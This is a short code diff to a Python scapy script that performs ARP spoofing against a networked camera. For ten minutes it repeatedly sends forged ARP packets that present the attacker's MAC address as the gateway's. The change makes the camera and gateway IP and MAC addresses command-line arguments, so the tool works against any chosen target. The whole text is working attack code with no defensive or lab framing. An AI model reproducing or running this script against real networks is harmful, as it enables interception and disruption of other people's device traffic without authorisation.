@@ -1,7 +1,8 @@
 from scapy.all import ARP, sendp, get_if_hwaddr, Ether, IP, UDP
 import time, socket
-IF="en1"; CAM="192.168.4.24"; GW="192.168.4.1"
-me=get_if_hwaddr(IF); cam_mac="80:48:2c:4b:cf:0b"; gw_mac="48:dd:0c:c9:ec:0d"
+import sys
+IF="en1"; CAM=sys.argv[1] if len(sys.argv)>1 else "192.168.4.24"; CAMMAC=sys.argv[2] if len(sys.argv)>2 else "80:48:2c:4b:cf:0b"; GW=sys.argv[3] if len(sys.argv)>3 else "192.168.4.1"; GWMAC=sys.argv[4] if len(sys.argv)>4 else "48:dd:0c:c9:ec:0d"
+me=get_if_hwaddr(IF); cam_mac=CAMMAC; gw_mac=GWMAC
 end=time.time()+600
 while time.time()<end:
     sendp(ARP(op=1, psrc=GW, pdst=CAM, hwdst=cam_mac, hwsrc=me), iface=IF, verbose=0)
